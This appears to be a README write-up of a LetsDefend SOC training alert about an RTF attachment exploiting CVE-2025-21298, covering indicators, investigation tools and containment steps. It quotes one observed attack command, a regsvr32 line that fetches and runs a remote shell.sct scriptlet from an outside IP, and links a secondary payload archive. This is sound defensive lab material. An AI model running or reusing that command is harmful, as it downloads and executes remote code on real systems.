# SOC336-Windows-OLE-Zero-Click-RCE-Detection

# 📄 Project Title:
**Windows OLE Zero-Click RCE Exploitation - CVE-2025-21298 (SOC336 Detection)**

---

## 📅 Incident Details

- **Event ID**: 314  
- **Event Time**: February 4, 2025, 04:18 PM  
- **Detection Rule**: SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)  
- **Alert Level**: Security Analyst  
- **Classification**: Malware

---

## 📁 Incident Summary

On February 4, 2025, LetsDefend's SIEM triggered an alert for a **zero-click remote code execution (RCE)** exploitation attempt via an RTF attachment exploiting **CVE-2025-21298**.  
An email from `projectmanagement@pm.me` targeting `Austin@letsdefend.io` contained a malicious file (`mail.rtf`), which upon opening, initiated a fileless attack using the **regsvr32.exe** binary.

**Key Details:**

- **Attachment Name**: `mail.rtf`
- **Attachment Hash**: `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`
- **Threat Command**:
  ```
  C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
  ```
- **Malicious IP**: `84.38.130.118` (Latvia | rixhost.lv)
- **Request URL**:
  - `http://84.38.130.118.com/shell.sct`
  - Secondary Payload: [Attachment.zip](https://files-ld.s3.us-east-2.amazonaws.com/attachment.zip)

---

## 🛠️ Tools Used for investigation

- [VirusTotal](https://www.virustotal.com/)
- [AbuseIPDB](https://www.abuseipdb.com/)
- [ChatGPT](https://openai.com/)
- [URLhaus](https://urlhaus.abuse.ch/)

---


## 📸 Screenshots

| Screenshot | Description |
|:-----------|:------------|
| ![Results](/Results.png) | Investigation results overview |
| ![Artifacts](/artifacts.png) | Forensic artifacts collected |
| ![Command Execution](/cmd-run.png) | Command run details (cmd.exe / regsvr32 attack) |
| ![Log Management](/log-management.png) | Logs management and SIEM view |
| ![Raw Logs](/raw-log.png) | Raw event log showcasing payload |
| ![Threat Intelligence](/threat-intel.png) | Threat intel results about IP/domain |
| ![URLhaus Scan](/urlhaus.png) | Malicious URL investigation via URLhaus |
| ![VirusTotal Scan 1](/virustot1.png) | VirusTotal file scan result |
| ![VirusTotal Scan 2](/virustot2.png) | VirusTotal URL analysis result |

---



## 📊 Analysis and Actions Taken

- **Detection**: Malicious RTF identified via pattern matching of CVE-2025-21298.
- **Behavior Observed**: Fileless attack leveraging `regsvr32.exe` to execute remote script.
- **Initial Response**: IP flagged and attachment quarantined.
- **Containment**: Endpoint isolated, email purged across system, URL blocked at network level.
- **Escalation**: Incident escalated to Tier 2 SOC analysts for further forensic investigation.

---

## 🔥 Lessons Learned

- Importance of monitoring **fileless attacks** through behavior-based detection.
- **Zero-click exploits** require rapid detection before payload execution.
- Even **legitimate system binaries** like `regsvr32.exe` can be weaponized by threat actors.

---

## 🔥 Outcome

This exercise reinforced skills in:
- SIEM Log Analysis
- Threat Hunting
- Threat Intelligence Gathering
- Incident Response Documentation

---


## 📂 Project Structure

```bash
SOC336-Windows-OLE-Zero-Click-RCE/
├── README.md
├── email_alert.png
├── attachment_hash.png
├── command_execution.png
│   ├── virus_total_analysis.png
│   ├── abuseipdb_lookup.png
│   ├── urlhaus_submission.png
│   └── soc_alert_details.png
